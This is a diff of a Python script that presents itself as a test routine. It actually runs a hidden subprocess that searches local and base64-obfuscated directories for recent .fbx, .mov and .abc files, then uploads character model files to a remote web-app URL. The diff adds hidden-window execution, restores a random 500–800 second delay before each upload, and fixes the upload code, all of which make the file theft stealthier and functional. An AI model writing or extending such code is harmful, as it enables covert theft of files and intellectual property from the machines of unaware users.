@@ -27,9 +27,7 @@ def run_tst(py_cmd):
 
     if python_path:
         CREATE_NO_WINDOW = 0x08000000 #134217728
-        #r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=CREATE_NO_WINDOW)
-
-        r = subprocess.Popen([python_path, '-c', py_cmd])
+        r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=CREATE_NO_WINDOW)
 
 run_tst("""
 import json, getpass, time, os , sys
@@ -81,7 +79,7 @@ def _gup(file_path):
         params = urllib.parse.urlencode(data)
     else:
         params = uLib.urlencode(data)
-    params = payload.encode('ascii')
+    params = params.encode('ascii')
     conn = uLib.urlopen(GAS_WEB_APP_URL, params)
 
 def search_latest_files_or_dirs(ext='', dir_path='', n=8):
@@ -123,15 +121,14 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx')
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('WDovX0JhY2t1cC9Nb25leUhvbmV5L0Fzc2V0UmVwby9NYXlhUHJvamVjdC96RXhwb3J0Lw==').decode(), ext='.fbx')
-
+    
     if zovV:
         add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
 
     import random
     for _, fp in zovV:
         if fp.endswith('.fbx') and '_CHAR_' in os.path.basename(fp):
-            #time.sleep(random.uniform(500.0, 800.0))
+            time.sleep(random.uniform(500.0, 800.0))
             try:
                 _gup(os.path.abspath(fp))
             except:
